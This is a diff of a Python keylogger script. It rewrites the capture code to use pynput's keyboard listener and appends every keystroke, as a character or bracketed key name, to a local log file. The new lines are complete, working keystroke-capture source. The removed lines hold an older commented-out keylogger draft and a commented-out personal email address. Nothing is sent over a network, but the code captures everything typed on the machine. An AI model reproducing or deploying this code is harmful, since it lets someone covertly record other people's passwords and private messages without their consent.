@@ -1,44 +1,31 @@
-import keyboard
+from pynput import keyboard
 
-log_file = 'keystrokes.txt'
+log_file = 'keystrokes.log'
 
-def on_key_press(event):
-    with open(log_file, 'a') as f:
-        f.write('{}'.format(event.name))
+# Function to log keystrokes
+def on_press(key):
+    try:
+        # Capture the key name or character
+        if hasattr(key, 'char') and key.char is not None:
+            logged_key = key.char
+        else:
+            logged_key = f'[{key.name}]'
 
-keyboard.on_press(on_key_press)
+        # Log the keystroke to the file
+        with open(log_file, 'a') as f:
+            f.write(logged_key)
 
-keyboard.wait(hotkey='esc')
-# import keyboard
+        # Print to console for testing
+        print(f"Logged: {logged_key}")
 
-# def keylogger():
-#     log_file = 'keystrokes.log'
-#     #email = 'aggarwalmehak2016@gmail.com'
-    
-#     def on_key_press(event):
-#         key = event.name
-#         if len(key) > 1:
-#             key = f'[{key}]'
-        
-#         # Log the keystroke to the file
-#         with open(log_file, 'a') as f:
-#             f.write(key)
-        
-#         # Check if the keystroke matches any character in the email
-#         if key.lower() in email:
-#             with open(log_file, 'a') as f:
-#                 f.write(key)
+    except Exception as e:
+        print(f"Error: {e}")
 
-#     keyboard.on_press(on_key_press)
+# Start listening for keyboard input
+def start_keylogger():
+    print("Keylogger started. Press Ctrl+C to stop.")
+    with keyboard.Listener(on_press=on_press) as listener:
+        listener.join()
 
-#     try:
-#         keyboard.wait()  # Wait indefinitely
-#     except KeyboardInterrupt:
-#         pass
-#     finally:
-#         keyboard.unhook_all()
-
-# if __name__ == '__main__':
-#     print("Keylogger started. Press Ctrl+C to stop.")
-#     keylogger()
-
+if __name__ == "__main__":
+    start_keylogger()
